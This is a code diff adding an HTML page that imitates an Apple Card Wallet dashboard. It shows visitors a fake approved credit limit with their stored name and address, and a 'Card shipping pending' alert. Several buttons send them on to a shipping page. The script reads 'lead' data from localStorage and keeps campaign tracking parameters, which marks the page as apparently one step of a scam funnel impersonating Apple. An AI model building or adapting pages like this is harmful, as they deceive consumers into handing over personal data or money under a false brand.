@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple Card — Wallet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--gray-600:#424245;--success:#34C759;--warning:#FF9F0A;--error:#FF3B30;--surface:#FFFFFF}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--gray-100);padding-bottom:80px}
+
+        /* Top Bar */
+        .top-bar{background:var(--surface);padding:12px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:0.5px solid var(--gray-200)}
+        .top-bar .time{font-size:0.8125rem;font-weight:600}
+        .top-bar .wallet-title{display:flex;align-items:center;gap:6px;font-size:0.9375rem;font-weight:600}
+        .top-bar .wallet-title img{width:24px;height:29px}
+        .top-bar .avatar{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,var(--apple-blue),#34C759);display:flex;align-items:center;justify-content:center;font-size:0.625rem;font-weight:700;color:#fff}
+
+        /* Alert Banner */
+        .alert-banner{
+            margin:12px 16px 0;padding:12px 14px;
+            background:linear-gradient(135deg,rgba(255,159,10,0.1),rgba(255,59,48,0.05));
+            border:1px solid rgba(255,159,10,0.2);border-radius:14px;
+            display:flex;align-items:center;gap:10px;
+            cursor:pointer;transition:transform 0.2s;
+        }
+        .alert-banner:active{transform:scale(0.98)}
+        .alert-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,159,10,0.15);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .alert-icon svg{width:18px;height:18px;fill:var(--warning)}
+        .alert-text{flex:1}
+        .alert-text .at-title{font-size:0.8125rem;font-weight:600;color:var(--apple-black)}
+        .alert-text .at-desc{font-size:0.6875rem;color:var(--gray-500);margin-top:1px}
+        .alert-arrow svg{width:16px;height:16px;fill:var(--gray-400)}
+
+        /* Card Display */
+        .card-display{padding:20px 16px 16px;text-align:center}
+        .mini-card{
+            width:280px;height:176px;margin:0 auto;border-radius:16px;position:relative;overflow:hidden;
+            box-shadow:0 12px 40px rgba(0,0,0,0.15);cursor:pointer;
+            transform-style:preserve-3d;transition:transform 0.3s;
+        }
+        .mini-card:hover{transform:scale(1.02)}
+        .mini-card .mc-bg{position:absolute;inset:0;transition:background 0.5s}
+        .mini-card .mc-shine{position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.12) 45%,rgba(255,255,255,0.04) 50%,transparent 55%);animation:shine 4s ease infinite}
+        .mini-card .mc-content{position:absolute;inset:0;padding:20px;display:flex;flex-direction:column;justify-content:space-between;z-index:2}
+        .mc-top{display:flex;align-items:flex-start;justify-content:space-between}
+        .mc-logo img{width:26px;height:30px;filter:drop-shadow(0 1px 2px rgba(0,0,0,0.15))}
+        .mc-chip{position:absolute;right:20px;bottom:42px;width:32px;height:24px}
+        .mc-chip img{width:100%;height:100%}
+        .mc-nfc svg{width:18px;height:18px;fill:rgba(255,255,255,0.4)}
+        .mc-bottom{display:flex;align-items:flex-end;justify-content:space-between}
+        .mc-name{font-size:0.7rem;font-weight:500;letter-spacing:0.08em;text-transform:uppercase;color:#86868B}
+        .mc-type{font-size:0.55rem;color:rgba(255,255,255,0.5);margin-top:2px}
+        .mc-brand{font-size:0.7rem;font-weight:700;font-style:italic;color:rgba(255,255,255,0.7);letter-spacing:0.02em}
+
+        /* Balance Section */
+        .balance-section{padding:0 20px 16px;text-align:center}
+        .balance-label{font-size:0.75rem;color:var(--gray-500);margin-bottom:4px}
+        .balance-value{font-size:1.75rem;font-weight:800;color:var(--apple-black)}
+        .balance-value small{font-size:0.875rem;font-weight:600;color:var(--gray-500)}
+
+        /* Quick Actions */
+        .quick-actions{display:flex;gap:10px;padding:0 16px 16px;overflow-x:auto;scrollbar-width:none}
+        .quick-actions::-webkit-scrollbar{display:none}
+        .qa-btn{
+            flex-shrink:0;display:flex;flex-direction:column;align-items:center;gap:6px;
+            padding:14px 18px;background:var(--surface);border-radius:14px;
+            border:1px solid var(--gray-200);cursor:pointer;transition:all 0.2s;min-width:80px;
+        }
+        .qa-btn:hover{border-color:var(--apple-blue)}
+        .qa-btn:active{transform:scale(0.95)}
+        .qa-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center}
+        .qa-icon svg{width:16px;height:16px}
+        .qa-label{font-size:0.625rem;font-weight:600;color:var(--gray-600);white-space:nowrap}
+
+        /* Tabs */
+        .tabs{display:flex;padding:0 16px;gap:4px;margin-bottom:12px}
+        .tab{flex:1;padding:10px;text-align:center;font-size:0.75rem;font-weight:600;border-radius:10px;cursor:pointer;transition:all 0.2s;color:var(--gray-500);background:transparent}
+        .tab.active{background:var(--surface);color:var(--apple-black);box-shadow:0 1px 3px rgba(0,0,0,0.08)}
+
+        /* Tab Content */
+        .tab-content{padding:0 16px}
+        .tab-panel{display:none}
+        .tab-panel.active{display:block}
+
+        /* Info Cards */
+        .info-card{background:var(--surface);border-radius:14px;padding:16px;margin-bottom:10px;border:1px solid var(--gray-200)}
+        .ic-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+        .ic-title{font-size:0.8125rem;font-weight:600}
+        .ic-badge{padding:3px 8px;border-radius:6px;font-size:0.625rem;font-weight:600}
+        .ic-row{display:flex;justify-content:space-between;padding:8px 0;font-size:0.8125rem}
+        .ic-row:not(:last-child){border-bottom:1px solid var(--gray-100)}
+        .ic-row .label{color:var(--gray-500)}
+        .ic-row .value{font-weight:600}
+
+        /* Transactions */
+        .tx-item{display:flex;align-items:center;gap:12px;padding:12px;background:var(--surface);border-radius:12px;margin-bottom:8px;border:1px solid var(--gray-200)}
+        .tx-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .tx-icon svg{width:18px;height:18px}
+        .tx-info{flex:1}
+        .tx-name{font-size:0.8125rem;font-weight:600}
+        .tx-date{font-size:0.6875rem;color:var(--gray-400)}
+        .tx-amount{font-size:0.875rem;font-weight:700;text-align:right}
+        .tx-cashback{font-size:0.625rem;color:var(--success);text-align:right}
+
+        /* Bottom Nav */
+        .bottom-nav{
+            position:fixed;bottom:0;left:50%;transform:translateX(-50%);
+            max-width:520px;width:100%;
+            background:rgba(255,255,255,0.95);backdrop-filter:blur(20px);
+            border-top:0.5px solid var(--gray-200);
+            display:flex;padding:8px 0 12px;z-index:50;
+        }
+        .bn-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;cursor:pointer;position:relative}
+        .bn-item svg{width:22px;height:22px;fill:var(--gray-400);transition:fill 0.2s}
+        .bn-item span{font-size:0.5625rem;color:var(--gray-400);font-weight:500;transition:color 0.2s}
+        .bn-item.active svg{fill:var(--apple-blue)}
+        .bn-item.active span{color:var(--apple-blue)}
+        .bn-badge{position:absolute;top:-2px;right:calc(50% - 16px);width:8px;height:8px;border-radius:50%;background:var(--error)}
+
+        @keyframes shine{0%,100%{transform:translateX(-100%)}50%{transform:translateX(100%)}}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <!-- Top Bar -->
+        <div class="top-bar">
+            <div class="time" id="currentTime">00:00</div>
+            <div class="wallet-title">
+                <img src="assets/images/black.svg" alt="" style="width:28px;height:29px">
+                Wallet
+            </div>
+            <div class="avatar" id="avatarInitials">V</div>
+        </div>
+
+        <!-- Alert -->
+        <div class="alert-banner" onclick="goToShipping()">
+            <div class="alert-icon"><svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg></div>
+            <div class="alert-text">
+                <div class="at-title">Card shipping pending</div>
+                <div class="at-desc">Complete shipping to receive your Apple Card</div>
+            </div>
+            <div class="alert-arrow"><svg viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg></div>
+        </div>
+
+        <!-- Card Display -->
+        <div class="card-display">
+            <div class="mini-card" id="miniCard">
+                <div class="mc-bg" id="mcBg"></div>
+                <div class="mc-shine"></div>
+                <div class="mc-content">
+                    <div class="mc-top">
+                        <div>
+                            <div class="mc-logo"><img id="mcLogo" src="assets/images/logo3d.svg" alt=""></div>
+                        </div>
+                        <div class="mc-nfc"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 7.5c0 .83-.67 1.5-1.5 1.5S16 10.33 16 9.5 16.67 8 17.5 8s1.5.67 1.5 1.5zm-4.5 0c0 .83-.67 1.5-1.5 1.5s-1.5-.67-1.5-1.5S12.17 8 13 8s1.5.67 1.5 1.5zm-5.5 0c0 .83-.67 1.5-1.5 1.5S6 10.33 6 9.5 6.67 8 7.5 8 9 8.67 9 9.5z"/></svg></div>
+                    </div>
+                    <div class="mc-chip"><img src="assets/images/chip3d.svg" alt=""></div>
+                    <div class="mc-bottom">
+                        <div>
+                            <div class="mc-name" id="mcName">GUEST</div>
+                            <div class="mc-type" id="mcType">Apple Card • Titanium</div>
+                        </div>
+                        <div class="mc-brand">VISA</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Balance -->
+        <div class="balance-section">
+            <div class="balance-label">Available credit</div>
+            <div class="balance-value"><small>$</small><span id="balanceValue">5,000</span><small>.00</small></div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="quick-actions">
+            <div class="qa-btn" onclick="goToShipping()">
+                <div class="qa-icon" style="background:rgba(255,159,10,0.12)"><svg viewBox="0 0 24 24" fill="#FF9F0A"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></div>
+                <span class="qa-label">Shipping</span>
+            </div>
+            <div class="qa-btn">
+                <div class="qa-icon" style="background:rgba(0,113,227,0.12)"><svg viewBox="0 0 24 24" fill="#0071E3"><path d="M19 14V6c0-1.1-.9-2-2-2H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zm-9-1c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm13-6v11c0 1.1-.9 2-2 2H4v-2h17V7h2z"/></svg></div>
+                <span class="qa-label">Statement</span>
+            </div>
+            <div class="qa-btn">
+                <div class="qa-icon" style="background:rgba(52,199,89,0.12)"><svg viewBox="0 0 24 24" fill="#34C759"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg></div>
+                <span class="qa-label">Cashback</span>
+            </div>
+            <div class="qa-btn">
+                <div class="qa-icon" style="background:rgba(175,82,222,0.12)"><svg viewBox="0 0 24 24" fill="#AF52DE"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg></div>
+                <span class="qa-label">Security</span>
+            </div>
+            <div class="qa-btn">
+                <div class="qa-icon" style="background:rgba(255,59,48,0.12)"><svg viewBox="0 0 24 24" fill="#FF3B30"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
+                <span class="qa-label">Lock</span>
+            </div>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('resumo',this)">Overview</div>
+            <div class="tab" onclick="switchTab('transacoes',this)">Transactions</div>
+            <div class="tab" onclick="switchTab('beneficios',this)">Benefits</div>
+        </div>
+
+        <!-- Tab: Resumo -->
+        <div class="tab-content">
+            <div class="tab-panel active" id="panel-resumo">
+                <div class="info-card">
+                    <div class="ic-header">
+                        <div class="ic-title">Card Details</div>
+                        <div class="ic-badge" style="background:rgba(52,199,89,0.1);color:var(--success)">Active</div>
+                    </div>
+                    <div class="ic-row"><span class="label">Holder</span><span class="value" id="icNome">—</span></div>
+                    <div class="ic-row"><span class="label">Credit limit</span><span class="value" id="icLimite" style="color:var(--success)">—</span></div>
+                    <div class="ic-row"><span class="label">Due date</span><span class="value" id="icVenc">—</span></div>
+                    <div class="ic-row"><span class="label">Card</span><span class="value" id="icCor">—</span></div>
+                    <div class="ic-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">Free</span></div>
+                </div>
+
+                <div class="info-card">
+                    <div class="ic-header">
+                        <div class="ic-title">Shipping Address</div>
+                        <div class="ic-badge" style="background:rgba(255,159,10,0.1);color:var(--warning)">Pending</div>
+                    </div>
+                    <div class="ic-row"><span class="label">Address</span><span class="value" id="icAddr">—</span></div>
+                    <div class="ic-row"><span class="label">City</span><span class="value" id="icCidade">—</span></div>
+                    <div class="ic-row"><span class="label">ZIP code</span><span class="value" id="icCep">—</span></div>
+                    <div class="ic-row"><span class="label">Status</span><span class="value" style="color:var(--warning)">Awaiting shipment</span></div>
+                </div>
+            </div>
+
+            <!-- Tab: Transactions (simulated) -->
+            <div class="tab-panel" id="panel-transacoes">
+                <div class="tx-item">
+                    <div class="tx-icon" style="background:rgba(0,113,227,0.12)"><svg viewBox="0 0 24 24" fill="#0071E3"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg></div>
+                    <div class="tx-info"><div class="tx-name">Apple Store Online</div><div class="tx-date">Future approval</div></div>
+                    <div><div class="tx-amount">—</div><div class="tx-cashback">3% back</div></div>
+                </div>
+                <div class="tx-item">
+                    <div class="tx-icon" style="background:rgba(52,199,89,0.12)"><svg viewBox="0 0 24 24" fill="#34C759"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg></div>
+                    <div class="tx-info"><div class="tx-name">Cashback Available</div><div class="tx-date">Accumulated</div></div>
+                    <div><div class="tx-amount" style="color:var(--success)">$0.00</div><div class="tx-cashback">Activate your card</div></div>
+                </div>
+                <div style="text-align:center;padding:24px 0;color:var(--gray-400);font-size:0.8125rem">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="var(--gray-300)" style="display:block;margin:0 auto 8px"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>
+                    Transactions will appear here once your card is activated
+                </div>
+            </div>
+
+            <!-- Tab: Benefits -->
+            <div class="tab-panel" id="panel-beneficios">
+                <div class="info-card">
+                    <div class="ic-header"><div class="ic-title">Daily Cashback</div></div>
+                    <div class="ic-row"><span class="label">Apple Store</span><span class="value" style="color:var(--success)">3%</span></div>
+                    <div class="ic-row"><span class="label">Apple Pay</span><span class="value" style="color:var(--success)">2%</span></div>
+                    <div class="ic-row"><span class="label">Other purchases</span><span class="value" style="color:var(--success)">1%</span></div>
+                </div>
+                <div class="info-card">
+                    <div class="ic-header"><div class="ic-title">Exclusive Perks</div></div>
+                    <div class="ic-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">$0</span></div>
+                    <div class="ic-row"><span class="label">Fees</span><span class="value">No foreign transaction fees</span></div>
+                    <div class="ic-row"><span class="label">Installments</span><span class="value">Up to 12 months with 0% APR</span></div>
+                    <div class="ic-row"><span class="label">Support</span><span class="value">24/7 via iMessage</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Nav -->
+        <div class="bottom-nav">
+            <div class="bn-item active">
+                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span>Home</span>
+            </div>
+            <div class="bn-item">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+                <span>Statement</span>
+            </div>
+            <div class="bn-item" onclick="goToShipping()">
+                <div class="bn-badge"></div>
+                <svg viewBox="0 0 24 24"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4z"/></svg>
+                <span>Shipping</span>
+            </div>
+            <div class="bn-item">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Profile</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+        const LeadData={_key:'applecard_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
+        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+        LeadData.update({ page: 'dashboard' });
+        if (window.track) window.track('DashboardView', { content_id: 'apple-card-us', currency: 'USD' });
+        if (window.identifyUser) window.identifyUser();
+        const data = LeadData.load();
+        const userName = data.nome || 'Guest';
+        const firstName = userName.split(' ')[0];
+        const limite = data.limite_aprovado || 5000;
+        const corCartao = data.cartao_cor || 'silver';
+        const corLabel = data.cartao_cor_label || 'Titanium';
+
+        const colorMap = {
+            silver: 'linear-gradient(145deg, #E3E3E8, #C8C8CD, #E8E8ED)',
+            black: 'linear-gradient(145deg, #2C2C2E, #1A1A1C, #3A3A3C)',
+            gold: 'linear-gradient(145deg, #F5E6CC, #D4C4A0, #F0DCC0)'
+        };
+
+        // Populate
+        document.getElementById('avatarInitials').textContent = firstName.charAt(0).toUpperCase();
+        document.getElementById('mcName').textContent = userName.toUpperCase();
+        document.getElementById('mcType').textContent = `Apple Card • ${corLabel}`;
+        document.getElementById('mcBg').style.background = colorMap[corCartao] || colorMap.silver;
+        document.getElementById('balanceValue').textContent = limite.toLocaleString('en-US');
+
+        document.getElementById('icNome').textContent = userName;
+        document.getElementById('icLimite').textContent = `$${limite.toLocaleString('en-US')}.00`;
+        document.getElementById('icVenc').textContent = data.vencimento ? `Day ${data.vencimento}` : '—';
+        document.getElementById('icCor').textContent = `Apple Card ${corLabel}`;
+
+        if(data.rua){
+            let addr = data.numero ? `${data.numero} ${data.rua}` : data.rua;
+            if(data.complemento) addr += `, ${data.complemento}`;
+            document.getElementById('icAddr').textContent = addr;
+        }
+        const localidade = data.localidade || data.cidade;
+        const distrito = data.distrito || data.uf;
+        const codigoPostal = data.codigo_postal || data.cep;
+        if(localidade) document.getElementById('icCidade').textContent = `${localidade}, ${distrito||''}`;
+        if(codigoPostal) document.getElementById('icCep').textContent = codigoPostal;
+
+        // Time
+        function updateTime(){
+            const now=new Date();
+            document.getElementById('currentTime').textContent=now.getHours().toString().padStart(2,'0')+':'+now.getMinutes().toString().padStart(2,'0');
+        }
+        updateTime();setInterval(updateTime,30000);
+
+        // Tabs
+        window.switchTab=function(panel,el){
+            document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+            document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('panel-'+panel).classList.add('active');
+        };
+
+        function goToShipping(){
+            window.location.href = buildUrl('envio.html');
+        }
+        window.goToShipping = goToShipping;
+    </script>
+</body>
+</html>
